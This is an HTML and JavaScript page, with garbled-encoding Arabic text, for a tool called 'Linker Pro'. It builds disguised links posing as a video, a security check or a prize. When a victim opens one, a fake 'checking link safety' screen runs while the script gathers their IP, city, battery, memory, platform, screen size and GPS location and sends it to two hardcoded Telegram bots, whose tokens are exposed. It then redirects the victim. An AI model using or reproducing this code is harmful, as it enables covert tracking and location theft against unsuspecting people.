<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Linker Pro v2 | Ù„ÙˆØ­Ø© Ø§Ù„ØªØ­ÙƒÙ…</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
    <style>
        :root { --primary: #00d2ff; --secondary: #3a7bd5; --dark: #0f172a; --card: #1e293b; --text: #f8fafc; }
        * { box-sizing: border-box; }
        body { font-family: 'Cairo', sans-serif; background: var(--dark); color: var(--text); margin: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; overflow-x: hidden; }
        
        .container { background: var(--card); padding: 30px; border-radius: 24px; box-shadow: 0 20px 50px rgba(0,0,0,0.6); width: 90%; max-width: 480px; text-align: center; border: 1px solid #334155; transition: 0.5s; }
        
        h2 { color: var(--primary); margin-top: 0; font-weight: 700; }
        p { color: #94a3b8; font-size: 14px; }

        /* Ø³ÙƒØ±ÙˆÙ„ Ø§Ù„Ø±ÙˆØ§Ø¨Ø· Ø§Ù„Ø£ÙÙ‚ÙŠ */
        .scroll-wrapper { display: flex; overflow-x: auto; gap: 15px; padding: 20px 5px; scroll-snap-type: x mandatory; scrollbar-width: none; -ms-overflow-style: none; }
        .scroll-wrapper::-webkit-scrollbar { display: none; }
        
        .link-card { min-width: 85%; background: rgba(15, 23, 42, 0.6); padding: 20px; border-radius: 18px; border: 1px dashed var(--primary); scroll-snap-align: center; transition: 0.3s; }
        .link-card:hover { border-style: solid; transform: scale(1.02); }
        .link-card span { display: block; color: var(--primary); font-weight: bold; margin-bottom: 8px; font-size: 14px; }
        .link-url { font-size: 11px; word-break: break-all; color: #cbd5e1; background: #0f172a; padding: 10px; border-radius: 8px; margin-bottom: 12px; }

        /* Ø£Ø²Ø±Ø§Ø± ÙˆÙ…Ø¯Ø®Ù„Ø§Øª */
        input { width: 100%; padding: 14px; border-radius: 12px; border: 1px solid #334155; background: #0f172a; color: white; margin-bottom: 20px; outline: none; transition: 0.3s; }
        input:focus { border-color: var(--primary); box-shadow: 0 0 10px rgba(0, 210, 255, 0.2); }
        
        button { background: linear-gradient(135deg, var(--primary), var(--secondary)); border: none; padding: 14px; border-radius: 12px; color: white; font-weight: bold; cursor: pointer; width: 100%; transition: 0.3s; font-size: 16px; }
        button:hover { opacity: 0.9; transform: translateY(-2px); }
        .copy-btn { background: #334155; font-size: 13px; margin-top: 5px; }

        /* Ø´Ø§Ø´Ø© Ø§Ù„ØªØ­Ù…ÙŠÙ„ Ù„Ù„Ø¶Ø­ÙŠØ© */
        #loading-screen { display: none; }
        .loader-bar { width: 100%; height: 8px; background: #1e293b; border-radius: 10px; margin: 25px 0; overflow: hidden; position: relative; }
        .progress-fill { width: 0%; height: 100%; background: linear-gradient(90deg, var(--primary), var(--secondary)); border-radius: 10px; transition: width 0.1s linear; }

        .footer-tag { font-size: 10px; color: #475569; margin-top: 20px; }
    </style>
</head>
<body>

<div id="main-ui" class="container">
    <h2>Linker Pro <span style="font-size: 12px; vertical-align: middle; opacity: 0.7;">v2.5</span></h2>
    <p>Ù‚Ù… Ø¨Ø¥Ù†Ø´Ø§Ø¡ Ø±Ø§Ø¨Ø· ØªÙ…ÙˆÙŠÙ‡ Ù„Ø¬Ù…Ø¹ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù‡Ø¯Ù</p>
    
    <input type="text" id="targetUrl" placeholder="Ø£Ø¯Ø®Ù„ Ø§Ù„Ø±Ø§Ø¨Ø· Ø§Ù„Ù†Ù‡Ø§Ø¦ÙŠ (Ù…Ø«Ù„Ø§Ù‹: https://google.com)">
    <button onclick="generateLinks()">ØªÙˆÙ„ÙŠØ¯ Ø§Ù„Ø±ÙˆØ§Ø¨Ø· Ø§Ù„Ù…Ù„ØºÙ…Ø©</button>

    <div id="resultBox" style="display: none; margin-top: 10px;">
        <div class="scroll-wrapper" id="linksContainer"></div>
        <p style="font-size: 11px;">ğŸ’¡ Ø§Ø³Ø­Ø¨ Ø§Ù„Ø¨Ø·Ø§Ù‚Ø§Øª Ù„Ù„ÙŠÙ…ÙŠÙ† ÙˆØ§Ù„ÙŠØ³Ø§Ø± Ù„Ø±Ø¤ÙŠØ© Ø§Ù„Ø±ÙˆØ§Ø¨Ø·</p>
    </div>
    <div class="footer-tag">ØªØ·ÙˆÙŠØ± Ù†Ø¸Ø§Ù… Ø§Ù„ØªØªØ¨Ø¹ Ø§Ù„Ù…ØªØ¹Ø¯Ø¯ Ù„Ù„Ø¨ÙˆØªØ§Øª</div>
</div>

<div id="loading-screen" class="container">
    <h3 id="status-msg">Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø£Ù…Ø§Ù† Ø§Ù„Ø±Ø§Ø¨Ø·...</h3>
    <div class="loader-bar">
        <divclass="" class="progress-fill" id="bar"></div>
    </div>
    <p>ÙŠØ±Ø¬Ù‰ Ø§Ù„Ø§Ù†ØªØ¸Ø§Ø±ØŒ Ø³ÙŠØªÙ… ØªØ­ÙˆÙŠÙ„Ùƒ ØªÙ„Ù‚Ø§Ø¦ÙŠØ§Ù‹ Ø¨Ø¹Ø¯ Ø§Ù„ÙØ­Øµ</p>
    <div id="gps-status" style="font-size: 11px; color: var(--primary);"></div>
</div>

<script>
    // Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¨ÙˆØªØ§Øª (Ø§Ù„ØªÙˆÙƒÙ† ÙˆØ§Ù„Ø¢ÙŠØ¯ÙŠ)
    const bots = [
        { token: "8594996038:AAEb5I-j5t8fp7GPIuyAlV4Z-irdKf2Nm7w", chat_id: "6194281534" },
        { token: "8314229840:AAFgxHWhWDBXIGIunznDigrSA3dlgTCFE-U", chat_id: "6068331455" }
    ];

    // 1. ÙˆØ¸ÙŠÙØ© ØªÙˆÙ„ÙŠØ¯ Ø§Ù„Ø±ÙˆØ§Ø¨Ø·
    function generateLinks() {
        const url = document.getElementById('targetUrl').value;
        if (!url || !url.startsWith('http')) return alert("ÙŠØ±Ø¬Ù‰ Ø¥Ø¯Ø®Ø§Ù„ Ø±Ø§Ø¨Ø· ØµØ­ÙŠØ­ ÙŠØ¨Ø¯Ø£ Ø¨Ù€ http");
        
        const base = window.location.href.split('?')[0];
        const templates = [
            { name: "ğŸ¬ Ø±Ø§Ø¨Ø· Ù…Ø´Ø§Ù‡Ø¯Ø© ÙÙŠØ¯ÙŠÙˆ", suffix: "watch_video" },
            { name: "ğŸ” Ø±Ø§Ø¨Ø· ÙØ­Øµ Ø£Ù…Ø§Ù†", suffix: "secure_check" },
            { name: "ğŸ Ø±Ø§Ø¨Ø· Ù‡Ø¯ÙŠØ© Ù…Ø¬Ø§Ù†ÙŠØ©", suffix: "claim_prize" }
        ];

        let html = "";
        templates.forEach(t => {
            const finalLink = `${base}?to=${encodeURIComponent(url)}&mode=${t.suffix}`;
            html += `
                <div class="link-card">
                    <span>${t.name}</span>
                    <div class="link-url">${finalLink}</div>
                    <button class="copy-btn" onclick="copyToClipboard('${finalLink}')">Ù†Ø³Ø® Ø§Ù„Ø±Ø§Ø¨Ø·</button>
                </div>`;
        });

        document.getElementById('linksContainer').innerHTML = html;
        document.getElementById('resultBox').style.display = 'block';
    }

    function copyToClipboard(text) {
        navigator.clipboard.writeText(text);
        alert("ØªÙ… Ù†Ø³Ø® Ø§Ù„Ø±Ø§Ø¨Ø· Ø¨Ù†Ø¬Ø§Ø­!");
    }

    // 2. ÙˆØ¸ÙŠÙØ© Ø¬Ù…Ø¹ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª (ØªÙ†ÙØ° Ø¹Ù†Ø¯ Ø¯Ø®ÙˆÙ„ Ø§Ù„Ø¶Ø­ÙŠØ©)
    async function initTracking() {
        const params = new URLSearchParams(window.location.search);
        const redirectTo = params.get('to');
        if (!redirectTo) return;

        // ØªØ¨Ø¯ÙŠÙ„ Ø§Ù„ÙˆØ§Ø¬Ù‡Ø©
        document.getElementById('main-ui').style.display = 'none';
        document.getElementById('loading-screen').style.display = 'block';

        // Ù…Ø­Ø§ÙƒØ§Ø© Ø§Ù„ØªØ­Ù…ÙŠÙ„
        let width = 0;
        const bar = document.getElementById('bar');
        const timer = setInterval(() => {
            if (width >= 100) clearInterval(timer);
            else { width++; bar.style.width = width + '%'; }
        }, 40);

        try {
            // Ø¬Ù„Ø¨ Ø§Ù„Ù€ IP
            const ipReq = await fetch('https://ipapi.co/json/').catch(() => null);
            const ipData = ipReq ? await ipReq.json() : { ip: "ÙØ´Ù„ Ø§Ù„Ø¬Ù„Ø¨", country_name: "ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ" };

            // Ø¬Ù„Ø¨ Ø§Ù„Ø¨Ø·Ø§Ø±ÙŠØ©
            let batteryInfo = "ØºÙŠØ± Ù…Ø¯Ø¹ÙˆÙ…";
            if (navigator.getBattery) {
                const b = await navigator.getBattery();
                batteryInfo = `${Math.round(b.level * 100)}% (${b.charging ? 'ÙŠÙØ´Ø­Ù†' : 'ØªÙØ±ÙŠØº'})`;
            }

            let report = `ğŸš¨ *ØµÙŠØ¯ Ø¬Ø¯ÙŠØ¯ (ØªÙ‚Ø±ÙŠØ± Ø´Ø§Ù…Ù„)* ğŸš¨\n\n` +
                         `ğŸŒ *Ø§Ù„Ù€ IP:* \`${ipData.ip}\`\n` +
                         `ğŸ“ *Ø§Ù„Ù…ÙˆÙ‚Ø¹:* ${ipData.country_name} - ${ipData.city || ''}\n` +
                         `ğŸ”Œ *Ø§Ù„Ù…Ù†ÙØ°:* \`${window.location.port || '443 (HTTPS)'}\`\n` +
                         `ğŸ”‹ *Ø§Ù„Ø¨Ø·Ø§Ø±ÙŠØ©:* ${batteryInfo}\n` +
                         `ğŸ§  *Ø§Ù„Ø±Ø§Ù…:* ${navigator.deviceMemory || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ'} GB\n` +
                         `ğŸ“± *Ø§Ù„Ù†Ø¸Ø§Ù…:* ${navigator.platform}\n` +
                         `ğŸ–¥ *Ø§Ù„Ø´Ø§Ø´Ø©:* ${window.screen.width}x${window.screen.height}\n` +
                         `ğŸ”— *Ø§Ù„ØªØ­ÙˆÙŠÙ„ Ø¥Ù„Ù‰:* ${redirectTo}`;

            // Ù…Ø­Ø§ÙˆÙ„Ø© Ø¬Ù„Ø¨ GPS
            navigator.geolocation.getCurrentPosition(async (pos) => {
                const maps = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                report += `\nğŸ“ *GPS Ø§Ù„Ø¯Ù‚ÙŠÙ‚:* [Ø§Ø¶ØºØ· Ù‡Ù†Ø§ Ù„ÙØªØ­ Ø§Ù„Ø®Ø±ÙŠØ·Ø©](${maps})`;
                await broadcast(report);
                finish(redirectTo);
            }, async () => {
                await broadcast(report);
                finish(redirectTo);
            }, { timeout: 5000 });

        } catch (err) {
            finish(redirectTo);
        }
    }

    async function broadcast(msg) {
        for (let bot of bots) {
            await fetch(`https://api.telegram.org/bot${bot.token}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: bot.chat_id, text: msg, parse_mode: "Markdown" })
            }).catch(() => {});
        }
    }

    function finish(url) {
        setTimeout(() => { window.location.href = url; }, 4000);
    }

    // Ø¨Ø¯Ø¡ Ø§Ù„ØªÙ†ÙÙŠØ°
    if (window.location.search.includes('to=')) {
        initTracking();
    }
</script>

</body>
</html>
